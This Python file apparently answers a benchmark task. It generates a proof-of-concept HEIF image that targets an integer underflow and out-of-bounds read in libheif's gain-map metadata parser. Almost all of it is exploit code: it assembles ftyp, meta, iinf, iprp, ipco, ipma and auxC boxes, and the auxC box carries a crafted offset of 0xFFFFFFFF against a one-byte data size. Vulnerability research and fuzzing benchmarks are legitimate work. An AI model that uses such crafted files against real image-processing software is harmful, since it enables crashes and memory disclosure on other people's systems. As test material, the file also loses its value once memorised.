import struct

class Solution:
    """
    Generates a Proof-of-Concept (PoC) for a heap buffer overflow in libheif.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC input that triggers the vulnerability in decodeGainmapMetadata().

        The vulnerability is an integer underflow caused by subtracting a large unsigned
        offset from a smaller buffer size. This bypasses a size check and leads to an
        out-of-bounds read.

        The PoC is a crafted HEIF file containing the necessary metadata to trigger
        the vulnerable code path. It includes:
        1.  `ftyp` box: To identify the file as a HEIF variant.
        2.  `meta` box: The main container for metadata.
        3.  `iinf` box: To define a "gain map" item, identified by a specific URN.
        4.  `iprp` box: To associate properties with the gain map item.
            - `ipco` box: Contains the malicious `auxC` property box.
            - `ipma` box: Links the `auxC` property to the gain map item.
        5.  `auxC` box: Contains the payload with a large `gainmap_data_offset`
            and a small `gainmap_data_size` to cause the underflow.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            A byte string representing the malicious HEIF file.
        """

        def box(btype: bytes, content: bytes) -> bytes:
            """Creates a standard ISO BMFF box."""
            return struct.pack('>I', 8 + len(content)) + btype + content

        def fullbox(btype: bytes, ver: int, flg: int, content: bytes) -> bytes:
            """Creates a full ISO BMFF box (with version and flags)."""
            header = struct.pack('>I', (ver << 24) | flg)
            return box(btype, header + content)

        # ftyp box: File Type Box
        # Use 'hdif' major brand for HDR Gain Map images.
        ftyp_box = box(b'ftyp', b'hdif\x00\x00\x00\x00heicmif1')

        # --- meta box content ---

        # iinf box: Item Information Box
        # Defines a single gain map item. The URN is required to identify it as such.
        urn = b'urn:mpeg:hevc:2015:hdr:gainmap:1.0\x00'
        
        # infe box: Item Info Entry for the gain map (item_ID=1)
        infe_content = struct.pack('>HH', 1, 0) + b'auxl' + urn
        infe_box = fullbox(b'infe', 0, 0, infe_content)

        iinf_content = struct.pack('>H', 1) + infe_box
        iinf_box = fullbox(b'iinf', 0, 0, iinf_content)

        # iprp box: Item Properties Box
        
        # ipco box: Item Property Container Box, holds the malicious auxC property.
        
        # auxC box content: The payload that triggers the vulnerability.
        # gainmap_data_size is small (1), gainmap_data_offset is large (0xFFFFFFFF).
        # The total size of the data is 28 bytes, which is the amount read by the
        # function before the vulnerable check.
        auxc_data = (
            b'\x00' * 2 +             # version and flags (v0, f0)
            b'\x00\x00' * 8 +         # gainmap_gamma
            b'\x00' * 2 +             # base_hdr_headroom, gainmap_hdr_headroom
            b'\x00\x00\x00\x01' +     # gainmap_data_size = 1
            b'\xff\xff\xff\xff'       # gainmap_data_offset = 0xFFFFFFFF
        )
        auxc_box = fullbox(b'auxC', 0, 0, auxc_data)
        ipco_box = box(b'ipco', auxc_box)
        
        # ipma box: Item Property Association Box
        # Links the auxC property (at index 1) to the gain map item (ID 1).
        ipma_content = (
            struct.pack('>I', 1) +   # entry_count
            struct.pack('>H', 1) +   # item_ID
            struct.pack('>B', 1) +   # association_count
            struct.pack('>B', 0x81)  # essential=1, property_index=1
        )
        ipma_box = fullbox(b'ipma', 0, 0, ipma_content)

        iprp_content = ipco_box + ipma_box
        iprp_box = box(b'iprp', iprp_content)

        # A minimal meta box containing only the necessary iinf and iprp boxes.
        # The 'hdlr' box is omitted to reduce size, as some parsers are lenient.
        meta_content = iinf_box + iprp_box
        meta_box = fullbox(b'meta', 0, 0, meta_content)

        # Assemble the final PoC.
        poc = ftyp_box + meta_box
        
        return poc